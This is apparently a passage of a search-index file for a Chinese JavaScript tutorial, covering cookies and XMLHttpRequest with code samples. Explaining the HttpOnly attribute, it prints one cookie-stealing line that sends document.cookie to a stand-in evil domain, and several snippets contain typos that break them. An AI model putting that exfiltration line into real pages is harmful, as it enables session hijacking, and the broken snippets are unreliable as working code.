<p>\u4e0b\u9762\u662f\u6839\u636e\u5c4f\u5e55\u7684\u5bbd\u5ea6\uff0c\u5c06\u7528\u6237\u5bfc\u5411\u4e0d\u540c\u7f51\u9875\u7684\u4ee3\u7801\u3002</p> <pre><code>if ((screen.width &lt;= 800) &amp;&amp; (screen.height &lt;= 600)) {\n  window.location.replace('small.html');\n} else {\n  window.location.replace('wide.html');\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/#105-cookie","title":"10.5 Cookie","text":""},{"location":"ebook-JS-basic/10-1-BOM/#_10","title":"\u6982\u8ff0","text":"<p>cookie \u662f\u670d\u52a1\u5668\u5728\u6d4f\u89c8\u5668\u5b58\u50a8\u7684\u5f88\u5c0f\u7684\u6587\u672c\u4fe1\u606f\uff0c\u901a\u5e38\u5c0f\u4e8e4KB\uff0c \u6d4f\u89c8\u5668\u53d1\u51fa\u8bf7\u6c42\u65f6\uff0c\u4f1a\u9644\u5e26cookie\u3002</p> <p>\u670d\u52a1\u5668\u53ef\u4ee5\u5224\u65ad\u4e24\u6b21\u7684\u8bf7\u6c42\u662f\u5426\u6765\u6e90\u4e8e\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0c\u53ef\u4ee5\u4fdd\u5b58\u7528\u6237\u81ea\u5b9a\u4e49\u8bbe\u7f6e\uff08\u8bed\u8a00\uff0c\u4fa7\u680f\u5bbd\u5ea6\uff0c\u98ce\u683c\uff09\uff0c\u4fdd\u5b58token\u3002</p> <p>\u6ce8\u610f\uff1acookie \u5f88\u5c0f\uff0c\u4e0d\u9002\u5408\u4fdd\u5b58\u5927\u91cf\u6570\u636e\uff0c\u5982\u679ccookie\u5f88\u5927\u5f71\u54cd\u6027\u80fd\uff08\u5927\u91cf\u5b58\u50a8\u653e\u5728storage\u4e2d\uff09\u3002</p> <p>cookie\u5305\u62ec\uff1a</p> <ul> <li>Cookie \u7684\u540d\u5b57</li> <li>Cookie \u7684\u503c\uff08\u771f\u6b63\u7684\u6570\u636e\u5199\u5728\u8fd9\u91cc\u9762\uff09</li> <li>\u5230\u671f\u65f6\u95f4</li> <li>\u6240\u5c5e\u57df\u540d\uff08\u9ed8\u8ba4\u662f\u5f53\u524d\u57df\u540d\uff09\uff1a\u5982\u679c\u662f\u67d0\u4e2a\u57df\u540d\u4e0b\u7684cookie\uff0cURL\u5fc5\u987b\u662f\u8fd9\u4e2a\u57df\u540d\u624d\u80fd\u643a\u5e26\u8fd9\u90e8\u5206cookie</li> <li>\u751f\u6548\u7684\u8def\u5f84\uff08\u9ed8\u8ba4\u662f\u5f53\u524d\u7f51\u5740\uff09</li> </ul> <p>\u53ef\u4ee5\u901a\u8fc7 window.navigator.cookieEnabled \u5224\u65ad\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301cookie\u3002</p> <p>\u6839\u636e\u540c\u6e90\u7b56\u7565\uff1a\u4e24\u4e2a\u7f51\u5740\u53ea\u8981\u57df\u540d\u548c\u7aef\u53e3\u76f8\u540c\u53ef\u4ee5\u5171\u4eabcookie(\u534f\u8bae\u4e0d\u540c\u4e5f\u53ef\u4ee5)</p>"},{"location":"ebook-JS-basic/10-1-BOM/#cookie-http","title":"cookie \u4e0e http","text":"<p>\u6d4f\u89c8\u5668\u53d1\u51fa\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u5728\u54cd\u5e94\u5934\u4e2d\u53ef\u4ee5\u8bbe\u7f6ecookie(\u53ef\u4ee5\u8bbe\u7f6e\u591a\u4e2acookie)    \u5982\u679c\u670d\u52a1\u5668\u7aef\u60f3\u6539\u4e00\u4e2acookie\uff0c\u9700\u8981\u57df\u540d\u548c\u8def\u5f84\u5b8c\u5168\u76f8\u540c\u624d\u80fd\u6539\u3002</p> <pre><code>HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: token=sdfghjklertyuiop\nSet-Cookie: tasty_cookie=strawberry\nSet-Cookie: key1=value2; domain=example.com; path=/blog\n</code></pre> <p>\u6d4f\u89c8\u5668\u53d1\u51fa\u8bf7\u6c42\u65f6\uff0c\u5c31\u4f1a\u643a\u5e26cookie\uff1b\u670d\u52a1\u5668\u83b7\u53d6cookie\u540e\uff0c\u4e0d\u80fd\u5224\u65adcookie\u7684\u8fc7\u671f\u65f6\u95f4\u548c\u8def\u5f84</p> <pre><code>GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: token=sdfghjklertyuiop; yummy_cookie=choco; tasty_cookie=strawberry\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/#_11","title":"\u5c5e\u6027","text":"<p>Expires Expires \u8868\u793acookie\u7684\u8fc7\u671f\u65f6\u95f4\uff0c\u6d4f\u89c8\u5668\u6839\u636e\u672c\u5730\u65f6\u95f4\u786e\u5b9acookie\u662f\u5426\u8fc7\u671f\uff08\u672c\u5730\u65f6\u95f4\u53ef\u80fd\u4e0d\u51c6\u786e\uff09\uff1b</p> <p>Max-Age Max-age \u8868\u793a\u4ece\u73b0\u5728\u5f00\u59cb\uff0ccookie \u5b58\u5728\u7684\u79d2\u6570\uff087\u5929\u5185\u767b\u5f55\uff09\uff1b\u5982\u679c\u4e0d\u8bbe\u7f6e\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u90a3\u4e48 cookie \u5c31\u662f session\uff08\u5bf9\u8bdd\uff09 cookie\uff0c\u5c31\u5728\u672c\u6b21\u5bf9\u8bdd\u7ed3\u675f\u540e\u9500\u6bc1\u3002</p> <pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n</code></pre> <p>Domain \u8bf4\u660ecookie\u7684\u57df\u540d\u548c\u8def\u5f84\uff0c\u53ea\u6709\u6ee1\u8db3\u8fd9\u4e2a\u57df\u540d\u540e\uff0c\u53d1\u9001\u8bf7\u6c42\u624d\u6dfb\u52a0cookie\uff1b</p> <p>Path \u53ea\u6709URL\u4e2d\u5305\u62ec\u8def\u5f84\u624d\u6dfb\u52a0cookie\uff08\u524d\u63d0\u662f\u540c\u6e90\u7b56\u7565\uff0c\u57df\u540d\u548c\u7aef\u53e3\u53f7\u4e00\u81f4\uff09</p> <p>Secure \u53ea\u6709\u534f\u8bae\u662fHTTPS\u624d\u4fdd\u5b58cookie\uff0c\u5982\u679c\u662fhttp\u8bf7\u6c42\uff0c\u6d4f\u89c8\u5668\u4f1a\u5ffd\u7565\u8fd9\u4e2acookie</p> <p>HTTPOnly \u53ea\u6709http\u8bf7\u6c42\u624d\u80fd\u83b7\u53d6\u5e76\u53d1\u9001\u5f53\u524d\u7684cookie\uff0c\u4e0d\u80fd\u901a\u8fc7\u811a\u672c\u83b7\u53d6cookie\uff0c\u907f\u514d\u6076\u610f\u811a\u672c\u8de8\u7ad9\u6ce8\u5165\u653b\u51fb\u3002\u8fd9\u91cc\u521b\u5efa\u4e00\u4e2a\u7a7a\u56fe\u7247\uff0c\u5e76\u628acookie\u53d1\u9001\u5230\u4e00\u4e2a\u5371\u9669\u7f51\u7ad9\uff08\u7528\u6237\u540d\u548c\u5bc6\u7801\uff09\uff1b\u5982\u679c\u8bbe\u7f6e\u4e86\u4e00\u4e2a Cookie \u7684<code>HttpOnly</code>\u5c5e\u6027\uff0cJS\u4ee3\u7801\u5c31\u4e0d\u4f1a\u8bfb\u5230\u8be5 Cookie\u3002</p> <pre><code>(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n</code></pre> <p>document.cookie \u83b7\u53d6\u5f53\u524d\u7684cookie\uff08HttpOnly\u5c5e\u6027\u4e0d\u8bbe\u7f6e\u65f6\u53ef\u4ee5\u83b7\u53d6\uff09\u83b7\u53d6\u7684\u662fcookie\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u8f6c\u5316</p> <pre><code>var cookies = document.cookie.split(';');\n</code></pre> <p>\u8fd9\u4e2a\u5c5e\u6027\u53ef\u5199\uff08\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u5bf9\u5f53\u524d\u7f51\u7ad9\u6dfb\u52a0Cookie\uff09\u5199\u5165 Cookie \u7684\u65f6\u5019\uff0c\u5fc5\u987b\u5bf9\u5206\u53f7\u3001\u9017\u53f7\u548c\u7a7a\u683c\u8fdb\u884c\u8f6c\u4e49\uff08\u5b83\u4eec\u90fd\u4e0d\u5141\u8bb8\u4f5c\u4e3a Cookie \u7684\u503c\uff09\uff0c\u8fd9\u53ef\u4ee5\u7528<code>encodeURIComponent</code>\u65b9\u6cd5\u8fbe\u5230\u3002<code>document.cookie</code>\u4e00\u6b21\u53ea\u80fd\u5199\u5165\u4e00\u4e2a Cookie\uff0c\u800c\u4e14\u5199\u5165\u5e76\u4e0d\u662f\u8986\u76d6\uff0c\u800c\u662f\u6dfb\u52a0\u3002\u5982\u679c\u6dfb\u52a0\u591a\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u5148\u8f6c\u5316\u6210\u6570\u7ec4\uff0c\u6539\u53d8\u6570\u7ec4\uff0c\u6700\u540e\u4fdd\u5b58cookie\u7684\u503c\uff08\u4f8b\u5982\u754c\u9762\u8bc4\u8bba\u680f\u7684\u5bbd\u5ea6\uff09\uff1b\u5199\u5165cookie \u65f6\u53ef\u4ee5\u540c\u65f6\u5199\u5165\u76f8\u5173\u5c5e\u6027\uff08\u8fc7\u671f\u65f6\u95f4\uff09</p> <pre><code>document.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n</code></pre> <p>Cookie \u7684\u5c5e\u6027\u4e00\u65e6\u8bbe\u7f6e\u5b8c\u6210\uff0c\u5c31\u6ca1\u6709\u529e\u6cd5\u8bfb\u53d6\u8fd9\u4e9b\u5c5e\u6027\u7684\u503c\u3002\u5220\u9664\u4e00\u4e2a\u73b0\u5b58 Cookie \u7684\u552f\u4e00\u65b9\u6cd5\uff0c\u662f\u8bbe\u7f6e\u5b83\u7684<code>expires</code>\u5c5e\u6027\u4e3a\u4e00\u4e2a\u8fc7\u53bb\u7684\u65e5\u671f\u3002</p> <pre><code>document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/#106-xmlhttpequest","title":"10.6 XMLHttpequest","text":""},{"location":"ebook-JS-basic/10-1-BOM/#_12","title":"\u6982\u8ff0","text":"<p>Ajax: \u5f02\u6b65JS\u548cXML\uff1b\u811a\u672c\u53d1\u8d77\u901a\u4fe1\uff0c\u5c31\u662fajax\u3002</p> <p>\u6b65\u9aa4\uff1a\u521b\u5efaXMLHttpRequest\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u53d1\u9001\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u54cd\u5e94\uff0c\u83b7\u53d6\u6570\u636e\u66f4\u65b0\u754c\u9762\u3002</p> <p>\u73b0\u5728ajax\u8fd4\u56de\u7684\u6570\u636e\u4e0d\u662fXML\u683c\u5f0f\uff0c\u901a\u5e38\u662fJSON\u683c\u5f0f\uff0c\u4f46\u662fajax\u8fd8\u4fdd\u7559\u3002\u73b0\u5728\u4e0d\u4ec5\u4ec5\u662fhttp\u534f\u8bae\uff0cfile ftp \u534f\u8bae\u4e5f\u53ef\u4ee5\uff0c\u53d1\u9001\u7684\u6570\u636e\u683c\u5f0f\u4e0d\u9650\u5236\u3002ajax\u53ea\u80fd\u5411\u540c\u6e90\u7f51\u5740\uff08\u534f\u8bae\u57df\u540d\u7aef\u53e3\u76f8\u540c\uff09\u53d1\u9001\u8bf7\u6c42\uff0c\u5982\u679c\u8de8\u57df\u4f1a\u62a5\u9519\u3002</p> <p>\u4e0b\u9762\u662f\u539f\u751fajax\u53d1\u9001get\u8bf7\u6c42\uff1a</p> <pre><code>var xhr = new XMLHttpRequest();\n\nxhr.onreadystatechange = function() {\n  if (xhr.readyState === 4) {\n    if (xhr.status === 200) {\n      console.log(xhr.responseText);\n    } else {\n      console.log(xhr.status);\n      cosnole.log(xhr.statusText);\n    }\n  }\n};\n\nxhr.omerror = function() {\n  console.error(xhr.statusText);\n};\n\nxhr.open('GET', 'http://example.com/page.php', true);\n// \u7b2c\u4e09\u4e2a\u53c2\u6570\u8868\u793a\u5f02\u6b65\u53d1\u9001\u8bf7\u6c42\nxhr.send(null);\n// get \u8bf7\u6c42\u4e0d\u5e26\u53c2\u6570\n</code></pre> <p>\u4e0a\u9762\u7684\u6848\u4f8b\u5728 example.com \u8bf7\u6c42\uff0c\u53ef\u4ee5\u83b7\u53d6\u4e0b\u9762\u7684\u8fd4\u56de\u503c\u3002\u5982\u679c\u4e0d\u662f\u540c\u6e90\uff0c\u4f1a\u663e\u793aCORS\u963b\u6b62\u3002</p> <pre><code>The page at 'https://wangdoc.com/javascript/bom/xmlhttprequest.html' was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint 'http://www.example.com/page.php'. This request has been blocked; the content must be served over HTTPS.\n</code></pre> <pre><code>&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Example Domain&lt;/title&gt;\n    &lt;meta charset=\"utf-8\" /&gt;\n    &lt;meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;div&gt;\n    &lt;h1&gt;Example Domain&lt;/h1&gt;\n    &lt;p&gt;This domain is established to be used for illustrative examples in documents. You may use this\n    domain in examples without prior coordination or asking for permission.&lt;/p&gt;\n    &lt;p&gt;&lt;a href=\"http://www.iana.org/domains/example\"&gt;More information...&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/#_13","title":"\u5b9e\u4f8b\u5c5e\u6027","text":"<p>xhr.readyState \u8868\u793a\u8bf7\u6c42\u7684\u72b6\u6001\uff0c4\u8868\u793a\u8bf7\u6c42\u5df2\u7ecf\u5b8c\u6210\uff0c\u5c5e\u6027\u53d8\u5316\u65f6\uff0c xhr.onreadystatechange \u4f1a\u6355\u83b7\u5230\u8fd9\u4e2a\u4e8b\u4ef6 xhr.response \u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\uff0c\u5982\u679c\u8bf7\u6c42\u72b6\u6001\u662f4\uff0c\u5c31\u662f\u5168\u90e8\u8fd4\u56de\u7684\u6570\u636e\uff1b\u5982\u679c\u8bf7\u6c42\u6ca1\u6709\u7ed3\u675f\uff083\uff09\uff0c\u8fd9\u4e2a\u53c2\u6570\u5c31\u662f\u8fd4\u56de\u7684\u90e8\u5206\u6570\u636e\uff1b\u53ef\u4ee5\u4f7f\u4efb\u4f55\u7684\u6570\u636e\u7c7b\u578b xhr.responseType \u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5c5e\u6027\u53ef\u5199\uff0c\u9ed8\u8ba4\u662ftext\u3002\u5728open\u65b9\u6cd5\u540e\uff0csend\u65b9\u6cd5\u524d\u53ef\u4ee5\u6539\u53d8\u8fd9\u4e2a\u53c2\u6570\uff0c\u53c2\u6570\u53ef\u4ee5\u53d6\u4e0b\u9762\u7684\u503c\u3002</p> <p>\"arraybuffer\"\uff1aArrayBuffer \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e8c\u8fdb\u5236\u6570\u7ec4\u3002\uff08\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u5f0f\u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u4f8b\u5982\u56fe\u7247\uff09 \"blob\"\uff1aBlob \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e8c\u8fdb\u5236\u5bf9\u8c61\u3002\u9002\u5408\u56fe\u7247\u4f20\u9012\u3002 \"document\"\uff1aDocument \u5bf9\u8c61\uff0c\u8868\u793a\u670d\u52a1\u5668\u8fd4\u56de\u4e00\u4e2a\u6587\u6863\u5bf9\u8c61\u3002\u64cd\u4f5cDOM\u65f6\uff0c\u76f4\u63a5\u8fd4\u56dedocument\u53ef\u4ee5\u52a0\u8f7d\u5230\u754c\u9762\u4e2d\uff08\u9700\u8981\u6253\u5f00CORS\uff09 \"json\"\uff1aJSON \u5bf9\u8c61\u3002 \"text\"\uff1a\u5b57\u7b26\u4e32\u3002\u76f4\u63a5\u5904\u7406\u6bd4\u8f83\u65b9\u4fbf</p> <pre><code>let xhr = new XMLHttpRequest();\nxhr.open('GET', 'path/iamge/test.png', true);\nxhr.responseType = 'blob';\nxhr.onreadystatechange = function() {\n  if (xhr.readystate === 4 &amp;&amp; xhr.status === 200) {\n    let res = xhr.response;\n    let blob = new Blob([res], {type: 'image/png'});\n    // or let blob = xhr.response\n  }\n}\nxhr.send();\n\n// \u4e8c\u8fdb\u5236\u6570\u7ec4 arraybuffer \u5904\u7406\u56fe\u7247\u7684\u8bf7\u6c42\nxhr.open('GET', 'to/test.png', true);\nxhr.responseType = 'arraybuffer';\nxhr.onload = function() {\n  let uInt8Array = new Uint8Array(this.response);\n  for (var i = 0, len = binStr.length; i &lt; len; ++i ) {\n    var byte = uInt8Array[i];\n  }\n}\n</code></pre> <p>\u4e0b\u9762\u5b9e\u4f8b\u5c5e\u6027\u662f\u670d\u52a1\u5668\u8fd4\u56de\u503c\u5c5e\u6027</p> <pre><code>xhr.responseText \u670d\u52a1\u5668\u8fd4\u56de\u7684\u5b57\u7b26\u4e32(\u5982\u679c\u8fd4\u56de\u7684\u4e0d\u662ftxt\u6587\u672c\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662fnull)\nxhr.responseXML (\u9996\u5148\u8bbe\u7f6eresponseType === document) \u8fd9\u4e2a\u5c5e\u6027\u662f\u89e3\u6790\u540e\u7684DOM\u6811\nxhr.responseURL \u83b7\u53d6\u670d\u52a1\u5668\u7684\u7f51\u5740\uff1a\u901a\u5e38\u548copen\u4e2d\u53c2\u6570\u76f8\u540c\uff0c\u7f51\u9875\u8df3\u8f6c\u540e\uff0c\u8fd9\u4e2a\u7f51\u5740\u5c31\u662f\u5b9e\u9645\u8fd4\u56de\u6570\u636e\u7684\u7f51\u5740\u3002\n\nxhr.status \u8fd4\u56deHTTP\u72b6\u6001\u7801\nxhr.statusText \u201cOK\u201d\u548c\u201cNot Found\u201d \u5bf9\u5e94200\u548c404\nxhr.timeout \u8bbe\u7f6e\u6beb\u79d2\u6570\uff0c\u5982\u679c\u8bf7\u6c42\u8d85\u65f6\uff0c\u505c\u6b62\u8bf7\u6c42\uff08\u4e0b\u9762\u662f\u4f8b\u5b50\uff09\n</code></pre> <pre><code>var xhr = new XMLHttpRequest();\n\nxhr.ontimeout = function (e) {\n  console.error(e);\n};\n\nxhr.onload = function() {\n  if (xhr.readyState === 4) {\n    if (xhr.status === 200) {\n      // \u5904\u7406\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\n    } else {\n      console.error(xhr.statusText);\n    }\n  }\n};\n\nxhr.open('GET', url, true);\nxhr.timeout = 10 * 1000; // \u6307\u5b9a 10 \u79d2\u949f\u8d85\u65f6\nxhr.send(null);\n</code></pre> <p>\u4e0b\u9762\u662f\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027</p> <pre><code>XMLHttpRequest.onloadstart\uff1aloadstart \u4e8b\u4ef6\uff08HTTP \u8bf7\u6c42\u53d1\u51fa\uff09\u7684\u76d1\u542c\u51fd\u6570\nXMLHttpRequest.onprogress\uff1aprogress\u4e8b\u4ef6\uff08\u6b63\u5728\u53d1\u9001\u548c\u52a0\u8f7d\u6570\u636e\uff09\u7684\u76d1\u542c\u51fd\u6570\n\u8fd9\u4e2a\u4e8b\u4ef6\u5bf9\u8c61\u5177\u6709\u4e09\u4e2a\u5c5e\u6027\uff1aloaded total lengthComputable(\u5e03\u5c14\u503c\uff0c\u8868\u793a\u52a0\u8f7d\u7684\u8fdb\u5ea6\u662f\u5426\u53ef\u4ee5\u8ba1\u7b97)\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528 loaded/total \u83b7\u53d6\u5df2\u52a0\u8f7d\u7684\u767e\u5206\u6bd4\n\nXMLHttpRequest.onabort\uff1aabort \u4e8b\u4ef6\uff08\u8bf7\u6c42\u4e2d\u6b62\uff0c\u6bd4\u5982\u7528\u6237\u8c03\u7528\u4e86abort()\u65b9\u6cd5\uff09\u7684\u76d1\u542c\u51fd\u6570\nXMLHttpRequest.onerror\uff1aerror \u4e8b\u4ef6\uff08\u8bf7\u6c42\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570\nXMLHttpRequest.onload\uff1aload \u4e8b\u4ef6\uff08\u8bf7\u6c42\u6210\u529f\u5b8c\u6210\uff09\u7684\u76d1\u542c\u51fd\u6570\nXMLHttpRequest.ontimeout\uff1atimeout \u4e8b\u4ef6\uff08\u7528\u6237\u6307\u5b9a\u7684\u65f6\u9650\u8d85\u8fc7\u4e86\uff0c\u8bf7\u6c42\u8fd8\u672a\u5b8c\u6210\uff09\u7684\u76d1\u542c\u51fd\u6570\nXMLHttpRequest.onloadend\uff1aloadend \u4e8b\u4ef6\uff08\u8bf7\u6c42\u5b8c\u6210\uff0c\u4e0d\u7ba1\u6210\u529f\u6216\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570\n</code></pre> <p>xhr.withCredentials \u8868\u793a\u8de8\u57df\u8bf7\u6c42\u65f6\uff0c\u7528\u6237\u4fe1\u606f\uff08cookie\uff09\u662f\u5426\u5305\u542b\u5728\u8bf7\u6c42\u5934\u4e2d\uff08\u9ed8\u8ba4\u662ffalse\uff09\u5982\u679c\u662f\u540c\u57df\u8bf7\u6c42\uff0c\u4e0d\u9700\u8981\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027 \u6d4f\u89c8\u5668\u8bbe\u7f6e xhr.withCredentials = true; \u670d\u52a1\u5668\u4f1a\u8fd4\u56de Access-Control-Allow-Credentials: true </p> <p>\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u53ef\u4ee5\u83b7\u53d6\u4e0a\u4f20\u7684\u8fdb\u5ea6\uff0c\u4f7f\u7528 upload \u83b7\u53d6\u4e0a\u4f20\u7684\u8fdb\u5ea6</p> <pre><code>&lt;process min=\"0\" max=\"100\" value=\"0\"&gt;0%&lt;/process&gt;\n</code></pre> <pre><code>function upload(blobOrFile) {\n  let xhr = new XMLHttpRequest();\n  xhr.open('POST', '/server', true);\n  xhr.onload = function(e) {\n    console.log(e);\n  }\n  let progressBar = document.querySelector('progress');\n  xhr.upload.onprogress = function(e) {\n    progressBar.value = (e.loaded/e.total) * 100;\n    progressBar.textContent = progressBar.value; // \u517c\u5bb9\u8001\u6d4f\u89c8\u5668\n  }\n  xhr.send(blobOrFile);\n}\n\nlet file = new Blob(['hello world']);\nupload(file, {type: 'text/plain'});\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/#_14","title":"\u5b9e\u4f8b\u65b9\u6cd5","text":"<ul> <li> <p>xhr.open('GET', url, true, userName, password) \u4f20\u8f93\u7684\u65b9\u6cd5\uff0cURL\uff0c\u662f\u5426\u5f02\u6b65\uff08\u9ed8\u8ba4\u662f\u5f02\u6b65\uff09\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801\uff08\u540e\u4e24\u4e2a\u53c2\u6570\u53ef\u9009\uff09\u5982\u679c\u5bf9\u4f7f\u7528\u8fc7open\u7684xhr\u518d\u6b21\u4f7f\u7528open\uff0c\u76f8\u5f53\u4e8e abort \u5173\u95ed\u8fd9\u4e2a\u8bf7\u6c42\u3002</p> </li> <li> <p>xhr.sned(data); \u5982\u679c\u662fget\u8bf7\u6c42\uff0c\u53ea\u53d1\u9001URL\uff0c\u8fd9\u91cc\u76f4\u63a5\u4f20null\u5373\u53ef\u3002\u5982\u679c\u662fpost\u8bf7\u6c42\uff0c\u8fd9\u91cc\u9700\u8981\u4f20\u5165\u6570\u636e\u3002\u6570\u636e\u7684\u683c\u5f0f\u53ef\u4ee5\u662fblob DOM string arraybuffer formdata(\u8868\u5355\u66f4\u5e38\u7528)</p> </li> </ul> <pre><code>var formData = new FormData();\nformData.append('username', '\u5f20\u4e09');\nformData.append('email', 'zhangsan@example.com');\nformData.append('birthDate', 1940);\n\nxhr.open('POST', 'http://www.example.com', true);\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send(formData);\n</code></pre> <ul> <li>xhr.setRequestHeader('Content-Type', 'application/json');  \u8bbe\u7f6e\u8bf7\u6c42\u5934\u7684\u4fe1\u606f\uff0c\u5fc5\u987b\u4f4d\u4e8exhr.open() \u548c xhr.send() \u4e4b\u95f4\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u6bb5\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5b57\u6bb5\u503c\u3002\u5982\u679c\u8be5\u65b9\u6cd5\u591a\u6b21\u8c03\u7528\uff0c\u8bbe\u5b9a\u540c\u4e00\u4e2a\u5b57\u6bb5\uff0c\u5219\u6bcf\u4e00\u6b21\u8c03\u7528\u7684\u503c\u4f1a\u88ab\u5408\u5e76\u6210\u4e00\u4e2a\u5355\u4e00\u7684\u503c\u53d1\u9001\u3002</li> </ul> <pre><code>xhr.setRequestHeader('Content-Type', 'application/json');\nxhr.setRequestHeader('Content-Length', JSON.stringify(data).length);\nxhr.send(JSON.stringify(data));\n\u8fd9\u91cc\u8bbe\u7f6e\u4e86\u6570\u636e\u7c7b\u578b\u662fJSON\uff0c\u8bbe\u7f6e\u6570\u636e\u7684\u957f\u5ea6\u3002\u6539\u8fdb\uff1astringify \u8017\u65f6\uff0c\u53ef\u4ee5\u6267\u884c\u4e00\u6b21\n</code></pre> <ul> <li> <p>xhr.overrideMimeType('text/plain') \u8fd9\u4e2a\u65b9\u6cd5\u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528\uff1b\u5982\u679c\u6307\u5b9a\u67d0\u4e00\u4e2a\u6570\u636e\u7c7b\u578b\uff0c\u8fd4\u56de\u7684\u6570\u636e\u662ftext/xml\uff0c\u4f46\u662f\u5404\u79cd\u539f\u56e0\u9020\u6210\u6d4f\u89c8\u5668\u89e3\u6790\u4e0d\u6210\u529f\uff0c\u9700\u8981\u83b7\u53d6\u539f\u59cb\u6570\u636e\uff0c\u90a3\u4e48\u5c31\u8bbe\u7f6e\u8fd9\u4e2a\u5c5e\u6027\u3002\u5982\u679c\u5e0c\u671b\u670d\u52a1\u5668\u8fd4\u56de\u6307\u5b9a\u7684\u6570\u636e\u7c7b\u578b\uff0c\u53ef\u4ee5\u7528<code>responseType</code>\u5c5e\u6027\u544a\u8bc9\u670d\u52a1\u5668\u3002</p> </li> <li> <p>xhr.getResponseHeader('Last') \u83b7\u53d6\u54cd\u5e94\u5934\u7684\u4fe1\u606f</p> </li> </ul> <pre><code>xhr.onload = () =&gt; {\n  console.log(this.getResponseHeader('Last-Modified'));\n}\n</code></pre> <ul> <li>xhr.getAllResponseHeaders() \u83b7\u53d6\u54cd\u5e94\u5934\u7684\u5168\u90e8\u4fe1\u606f\uff08\u5b57\u7b26\u4e32\uff09</li> </ul> <pre><code>date: Fri, 08 Dec 2017 21:04:30 GMT\\r\\n\ncontent-encoding: gzip\\r\\n\nx-content-type-options: nosniff\\r\\n\nserver: meinheld/0.6.1\\r\\n\nx-frame-options: DENY\\r\\n\ncontent-type: text/html; charset=utf-8\\r\\n\nconnection: keep-alive\\r\\n\nstrict-transport-security: max-age=63072000\\r\\n\nvary: Cookie, Accept-Encoding\\r\\n\ncontent-length: 6502\\r\\n\nx-xss-protection: 1; mode=block\\r\\n\n</code></pre> <p>\u53ef\u4ee5\u5904\u7406\u8fd9\u4e2a\u5b57\u7b26\u4e32\u83b7\u53d6\u4fe1\u606f</p> <pre><code>var headerString = xhr.getAllResponseHeaders();\nlet arr = headerString.trim().split(/[\\r\\n]+/);\nlet headerInfo = {};\n\narr.forEach((item) =&gt; {\n  let parts = item.split(': ');\n  let key = parts.shift();\n  let value = parts.join(': ');\n  headerInfo[key] = value;\n});\n</code></pre> <ul> <li>xhr.abort() \u7ec8\u6b62\u53d1\u9001\u7684\u8bf7\u6c42\uff0c\u6b64\u65f6 readyState is 4, status is 0.</li> </ul>"},{"location":"ebook-JS-basic/10-1-BOM/#_15","title":"\u5b9e\u4f8b\u4e8b\u4ef6","text":"<ul> <li>readystatechange === 4 \u8bf7\u6c42\u6210\u529f\uff0c\u53ef\u4ee5\u83b7\u53d6\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e</li> <li>progress \u8fd4\u56de\u4e0a\u4f20\u7684\u8fdb\u5ea6 xhr.addEventListener('progress', updateProgress);</li> <li>load abort error</li> <li>loadend \u4e0a\u9762\u4e09\u4e2a\u4e8b\u4ef6\u540e\uff0c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u4f46\u662f\u4e0d\u786e\u5b9a\u662f\u5426\u52a0\u8f7d\u6210\u529f</li> <li>timeout \u8d85\u65f6\u4e8b\u4ef6</li> 